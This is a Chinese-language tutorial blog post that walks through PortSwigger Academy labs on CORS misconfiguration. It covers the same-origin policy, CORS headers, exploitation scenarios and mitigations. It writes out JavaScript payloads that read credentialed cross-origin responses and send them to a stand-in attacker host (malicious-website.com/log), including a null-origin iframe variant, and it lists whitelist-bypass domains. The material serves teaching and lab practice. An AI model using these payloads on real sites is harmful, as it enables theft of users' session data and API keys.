> 原文链接: https://www.anquanke.com//post/id/246029 


# 梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之客户端漏洞篇 - 跨域资源共享(CORS)专题


                                阅读量   
                                **35082**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t011e28256ef1394840.jpg)](https://p4.ssl.qhimg.com/t011e28256ef1394840.jpg)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 客户端漏洞篇介绍

> 相对于服务器端漏洞篇，客户端漏洞篇会更加复杂，需要在我们之前学过的服务器篇的基础上去利用。



## 客户端漏洞篇 – 跨域资源共享(CORS)专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFCORS%EF%BC%9F"></a>什么是CORS？

CORS是一种浏览器机制，可以限制指定域外的资源访问。但是如果配置不当则可能遭受跨域的攻击。并且该机制并不能用来抵御CSRF攻击。

### <a class="reference-link" name="%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5(SOP)"></a>同源策略(SOP)

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"></a>什么是同源策略

同源策略也是一种安全机制，可以用来防止网站互相攻击。它限制从一个源访问另一个源的数据。源包括URI协议、域和端口号。例如这样的URL<br>`http://normal-website.com/example/example.html`<br>
上面这个URL使用了http协议，域为normal-website.com，端口号为80，我们通过下面这个表格对比理解什么样的算同源，什么样的不算。

<th style="text-align: center;">访问的URL</th><th style="text-align: center;">是否允许访问？</th>
|------
<td style="text-align: center;">[http://normal-website.com/example/](http://normal-website.com/example/)</td><td style="text-align: center;">允许(相同的协议、域、端口号)</td>
<td style="text-align: center;">[http://normal-website.com/example2/](http://normal-website.com/example2/)</td><td style="text-align: center;">允许(相同的协议、域、端口号)</td>
<td style="text-align: center;">[https://normal-website.com/example/](https://normal-website.com/example/)</td><td style="text-align: center;">拒绝(不同的协议、端口号)</td>
<td style="text-align: center;">[http://en.normal-website.com/example/](http://en.normal-website.com/example/)</td><td style="text-align: center;">拒绝(不同的域)</td>
<td style="text-align: center;">[http://www.normal-website.com/example/](http://www.normal-website.com/example/)</td><td style="text-align: center;">拒绝(不同的域)</td>
<td style="text-align: center;">[http://normal-website.com:8080/example/](http://normal-website.com:8080/example/)</td><td style="text-align: center;">拒绝(不同的端口号)</td>

但是在IE中，同源策略只考虑协议和域，不考虑端口号，所以最后一个在IE中是允许访问的。

### <a class="reference-link" name="%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E5%BF%85%E8%A6%81%E9%85%8D%E7%BD%AE%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9F"></a>为什么有必要配置同源策略？

当一个浏览器从一个源向另一个源发出HTTP请求时，与另一个域相关的任何cookie(包括身份验证会话cookie)也会作为请求的一部分发送，然后响应中的会话会包含用户的任何相关数据，如果没有同源策略，当你访问网站时，它可以读取你的邮件，消息等。也就是同源策略可以防止敏感信息被窃取

### <a class="reference-link" name="%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E6%98%AF%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2%E7%9A%84%EF%BC%9F"></a>同源策略是如何部署的？

同源策略通常控制JS代码对跨域加载的内容的访问，通常允许页面资源的跨域加载。虽然SOP允许页面加载外部资源，但是不允许页面上的JS代码读取这些资源的内容，不过SOP也有一些例外的情况
- 有些对象跨域不可读但是可写，例如iframes或新窗口的location对象或locaation.href属性
- 有些对象可读但不可写，例如window对象的length属性和close属性
- replace函数通常可以被称为location对象上的跨域
- 可以跨域调用某些函数，比如可以在新窗口调用close、blur、focus函数，postMessage函数也可以在iframes和新窗口上调用来从一个源向另一个源发送消息
由于历史遗留问题，虽然不同子域属于不同源但是也允许访问所有子域，通常可以使用HttpOnly cookie标志位来缓解这一风险，可以使用document.domain来放宽SOP，当且仅当该属性是完全限定域名(FQDN)时才允许你为一个指定域放宽SOP

### <a class="reference-link" name="%E6%94%BE%E5%AE%BD%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"></a>放宽同源策略

从上面来看，同源策略是非常严格的，所以又设计了一些方法来放宽这些限制。使用跨域资源共享就可以放宽这些限制。它会定义一些HTTP头部字段，用来规定可信的Web源及相关属性，例如是否允许经过身份验证的访问。

### <a class="reference-link" name="CORS%E5%8F%8A%E5%85%B6Access-Control-Allow-Origin(ACAO)%E5%93%8D%E5%BA%94%E5%A4%B4"></a>CORS及其Access-Control-Allow-Origin(ACAO)响应头

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFACAO%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%9F"></a>什么是ACAO响应头？

该响应头包含在发往异源的响应包中，并标识请求允许的来源。浏览器将其与请求的来源进行匹配，如果相同则允许访问响应。

### <a class="reference-link" name="CORS%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0"></a>CORS的简单实现

当请求访问跨域资源时，会发出这样的请求并接收这样的响应

```
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com

The server on robust-website.com returns the following response:

HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

从响应来看，因为存在ACAO头，所以这个源是允许的。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E5%A4%84%E7%90%86%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82"></a>使用凭证处理跨域资源请求

一般情况下，是不包含任何凭证发送跨域资源请求的。但是如果需要开启，可以通过添加响应头Access-Control-Allow-Credentials，并将其设置为true来开启。例如

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=&lt;value&gt;

And the response to the request is:

HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

开启以后，浏览器就被允许读取带有凭证的跨域请求的响应了。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%94%BE%E5%AE%BDCORS%E8%A7%84%E8%8C%83"></a>使用通配符放宽CORS规范

如果将ACAO头设置为通配符<br>`Access-Control-Allow-Origin: *`<br>
通配符不能与其他字符混用，只能单独就一个通配符。通配符还不能与Access-Control-Allow-Credentials共用

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

这样设置是很危险的，这样所有人都能读取带有凭证的跨域请求的响应，就相当于没有防护了。

### <a class="reference-link" name="%E9%A3%9E%E8%A1%8C%E5%89%8D%E6%A3%80%E6%9F%A5"></a>飞行前检查

飞行前检查就是检查请求的方法是否是允许的，尤其是在使用非标准的HTTP方法，如OPTIONS方法时。并且还会返回一个允许的方法列表以供检查。例如这样的

```
OPTIONS /data HTTP/1.1
Host: &lt;some website&gt;
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

表明询问是否可以使用PUT方法和自定义头部字段Special-Request-Header发送跨域请求。然后我们得到这样的响应包。

```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

看到返回了一个允许的请求方法列表，并且看得到是支持那个自定义头部字段的。

### <a class="reference-link" name="CORS%E5%8F%AF%E4%BB%A5%E6%8A%B5%E5%BE%A1CSRF%E6%94%BB%E5%87%BB%E5%90%97%EF%BC%9F"></a>CORS可以抵御CSRF攻击吗？

CORS是不能用来抵御CSRF攻击的，因为它只是对同源策略的放宽措施，甚至配置不当还会增加遭受CSRF的风险。

### <a class="reference-link" name="CORS%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E"></a>CORS配置问题导致的漏洞

### <a class="reference-link" name="%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%9F%E6%88%90%E7%9A%84%E6%9D%A5%E8%87%AA%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8C%87%E5%AE%9A%E7%9A%84Origin%E5%A4%B4%E7%9A%84ACAO%E5%A4%B4"></a>服务器端生成的来自客户端指定的Origin头的ACAO头

有的应用程序需要允许来自多个指定域的资源，但是维护这样的一个列表很麻烦。有种方法就是从请求中读取Origin头并且在响应包中包含一个可以说明请求源被允许的响应头。例如接收到这样的请求

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然后返回这样的响应

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

因为响应包中是包含这样的头的，说明请求源是被允许的并且允许包含cookie。而且还能看出是允许来自任意来源的。所以我们可以跨域访问资源，这样我们就可以访问一些带有敏感信息的资源了，例如构造这样的payload。

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() `{`
location='//malicious-website.com/log?key='+this.responseText;
`}`;
```

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9C%89%E5%9F%BA%E7%A1%80%E6%BA%90%E6%98%A0%E5%B0%84%E7%9A%84CORS%E6%BC%8F%E6%B4%9E"></a>配套靶场：有基础源映射的CORS漏洞

首先我们观察到个人中心的响应包中有这样一段JS代码

[![](https://p1.ssl.qhimg.com/t01107aa0ad682b9ac1.png)](https://p1.ssl.qhimg.com/t01107aa0ad682b9ac1.png)

看到apikey是利用这段代码获取的，于是我们向这个路径发出请求观察一下响应包

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013ead3e0ac8efa60e.png)

发现响应包主体就是用户的一些信息，还有一个表明可以读取响应中的凭证的CORS响应头，然后我们测试一下是否可以向任何域发起跨域请求。

[![](https://p2.ssl.qhimg.com/t0162ef7091964f66aa.png)](https://p2.ssl.qhimg.com/t0162ef7091964f66aa.png)

发现响应头包含了该域，表明我们可以向任意域发起跨域请求，所以我们可以这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016f84ee922676ece8.png)

在Exploit Server保存，投放给受害者后，我们就能获取到对方的apikey了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a63fcb0ea8758208.png)

### <a class="reference-link" name="%E9%94%99%E8%AF%AF%E8%A7%A3%E6%9E%90Origin%E5%A4%B4"></a>错误解析Origin头

有的应用程序采用白名单的方式允许请求源，如果响应头包含了请求源则表明允许该源。例如这样的请求

```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

我们得到这样的响应

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

但是设置白名单还是会有问题，有的应用程序还允许访问请求源的子域。一般采取匹配前缀或后缀以及正则匹配的方式进行验证，这就很容易导致夹带恶意域进去，比如

```
normal-website.com
hackersnormal-website.com
normal-website.com.evil-user.net
```

### <a class="reference-link" name="%E8%A2%AB%E8%AE%A4%E4%B8%BA%E6%98%AF%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84Origin%E5%80%BCnull"></a>被认为是白名单的Origin值null

Origin是支持null值的，有些情况下Origin值为null
- 跨站重定向
- 来自序列化数据的请求
- 使用file协议的请求
- 沙箱过的跨域请求
有的时候为了方便开发，会将null的Origin值加入白名单，例如

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

然后的到这样的响应

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

攻击者可以构造上述四种会出现null的Origin值的场景以发动CORS攻击，例如

```
&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() `{`
location='malicious-website.com/log?key='+this.responseText;
`}`;
&lt;/script&gt;"&gt;&lt;/iframe&gt;
```

这应该构造的应该是第四种，即利用iframe沙箱发送跨域请求

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%8F%AF%E4%BF%A1Origin%E5%80%BCnull%E7%9A%84CORS%E6%BC%8F%E6%B4%9E"></a>配套靶场：可信Origin值null的CORS漏洞

首先我们先看一下null在不在白名单里

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ae9e7af42270bd05.png)

在，那我们可以利用上面的payload模板构造payload了

[![](https://p5.ssl.qhimg.com/t0161f6efc44945d7ec.png)](https://p5.ssl.qhimg.com/t0161f6efc44945d7ec.png)

这样我们就又可以获取到受害者的apikey了

[![](https://p0.ssl.qhimg.com/t012dc6931086c02dcd.png)](https://p0.ssl.qhimg.com/t012dc6931086c02dcd.png)

### <a class="reference-link" name="%E9%80%9A%E8%BF%87CORS%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8XSS"></a>通过CORS信任关系利用XSS

即使添加了白名单，但是如果白名单中的站点很容易遭受XSS攻击的话，攻击者可能向其投放恶意脚本然后利用CORS的信任关系执行它。例如

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

```

看到[https://subdomain.vulnerable-website.com](https://subdomain.vulnerable-website.com) 是受信任的源，并且允许发送凭证。我们可以直接构造这样的XSS payload进行攻击<br>`https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;`

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84CORS%E7%A0%B4%E5%9D%8FTLS"></a>使用配置不当的CORS破坏TLS

如果使用HTTPS传输的站点将使用HTTP传输的站点加入了可信源，像这样

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

```

针对这样的情况，攻击可以包括下面几个步骤
- 受害者发出的都是纯HTTP请求
- 攻击者注入一个重定向到该可信源([http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com))
- 受害者的浏览器跟随重定向
- 攻击者拦截这个纯HTTP请求，返回一个包含CORS请求的伪造的响应包给目标站点([https://vulnerable-website.com](https://vulnerable-website.com))
- 受害者的浏览器构造了一个包含Origin: [http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com) 的CORS请求
- 应用程序允许了这个请求，因为是可信源，然后敏感数据会返回在响应包中
- 攻击者伪造的请求可以将其发送到指定的域
看完这几个步骤以后大家肯定是一头雾水，下面我们通过一道靶场来理解这些

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9A%84CORS%E6%BC%8F%E6%B4%9E"></a>配套靶场：使用受信任的不安全协议的CORS漏洞

首先我们检测一下使用http的源是否被允许

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0174a0e8bd78a68050.png)

是允许的，经过测试得知检查库存页面会向http协议的子域发送请求并且存在XSS漏洞，所以我们结合前面学习的知识这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01edb37509d17b9b20.png)

我们看到这个payload很复杂，一共套了三层，最外层是可以向http发送请求并且存在XSS，对后续的利用有帮助，然后里面就是利用上一道靶场的知识构造的将敏感数据发送到指定服务器的操作。

[![](https://p0.ssl.qhimg.com/t01430993b15e95cabb.png)](https://p0.ssl.qhimg.com/t01430993b15e95cabb.png)

### <a class="reference-link" name="%E5%86%85%E7%BD%91%E4%B8%8E%E6%97%A0%E9%9C%80%E5%87%AD%E8%AF%81%E7%9A%84CORS"></a>内网与无需凭证的CORS

前面的获取用户敏感信息都要依赖于这项CORS配置<br>`Access-Control-Allow-Credentials: true`<br>
没有这项配置我们就只能访问不需要身份验证的内容。但是如果我们处于内网时，因为内网的安全标准普遍比外网低，所以我们可以通过一些漏洞获取对敏感数据的访问权限。例如

```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

我们看到在内网中允许来自任意源的资源请求，不需要用户凭证。我们可以在外网构造攻击利用受害者能够访问内网这个特点去获取敏感数据。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%91%E4%B8%AD%E8%BD%AC%E6%94%BB%E5%87%BB%E7%9A%84CORS%E6%BC%8F%E6%B4%9E"></a>配套靶场：使用内网中转攻击的CORS漏洞

我们需要扫描内网，所以我们在Exploit Server编写这样的脚本投放给受害者

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b282bc2325916305.png)

当主机存活时会向burp collaborator发送请求，我们检查一下接收端

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0111e8682f6405a977.png)

然后我们再探测是否存在XSS漏洞

[![](https://p4.ssl.qhimg.com/t0145fe587b308c32d5.png)](https://p4.ssl.qhimg.com/t0145fe587b308c32d5.png)

投放到受害者，然后再检查接收端

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018aed85f9ed2c7fdc.png)

发现存在XSS漏洞，然后我们利用XSS获取它管理界面的源码

[![](https://p5.ssl.qhimg.com/t01cbb7c2e14acb52b6.png)](https://p5.ssl.qhimg.com/t01cbb7c2e14acb52b6.png)

我们在接收端接收到了源码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0104c366f328709d5a.png)

通过审计源码得知删除用户请求是以用户名参数定位用户，于是我们再构造这样的payload

[![](https://p5.ssl.qhimg.com/t0111b9c92e05fd0f38.png)](https://p5.ssl.qhimg.com/t0111b9c92e05fd0f38.png)

投放给受害者就成功删除指定用户了

[![](https://p1.ssl.qhimg.com/t01da3f1ef361408909.png)](https://p1.ssl.qhimg.com/t01da3f1ef361408909.png)

这道靶场真的非常有意义，就是它让我知道XSS可以用来扫描内网存活主机、探测XSS漏洞、获取页面源码

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3%E5%9F%BA%E4%BA%8ECORS%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何缓解基于CORS的攻击？

### <a class="reference-link" name="%E6%AD%A3%E7%A1%AE%E9%85%8D%E7%BD%AE%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"></a>正确配置跨域请求

应该在有敏感资源的页面中的Access-Control-Allow-Origin头指定正确的可信源

### <a class="reference-link" name="%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%AF%E4%BF%A1%E7%AB%99%E7%82%B9"></a>仅允许可信站点

应该在Access-Control-Allow-Origin仅指定可信源，而不是动态的，不去验证是否为可信源。

### <a class="reference-link" name="%E9%81%BF%E5%85%8D%E5%B0%86null%E8%AE%BE%E7%BD%AE%E4%B8%BA%E7%99%BD%E5%90%8D%E5%8D%95"></a>避免将null设置为白名单

应该避免设置Access-Control-Allow-Origin: null，因为有些攻击手段可以利用这一点发动CORS攻击，比如iframe沙箱

### <a class="reference-link" name="%E9%81%BF%E5%85%8D%E5%9C%A8%E5%86%85%E7%BD%91%E4%B8%AD%E4%BD%BF%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6"></a>避免在内网中使用通配符

通过前面的案例我们知道大部分内网的安全标准比外网低，会设置Access-Control-Allow-Origin: *，这是非常危险的做法

### <a class="reference-link" name="CORS%E4%B8%8D%E8%83%BD%E7%94%A8%E6%9D%A5%E4%BB%A3%E6%9B%BF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"></a>CORS不能用来代替服务器端安全策略

CORS只是浏览器安全机制，所以并不能用来代替服务器端的安全策略，服务器端还是不能放松警惕，还是要配置身份验证，会话管理之类的安全策略



## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之客户端漏洞篇 – 跨域资源请求(CORS)专题的全部内容啦，本专题主要讲了同源策略(SOP)以及CORS的作用、如何部署、漏洞利用、防护等，感兴趣的同学可以在评论区进行讨论，嘻嘻嘻。
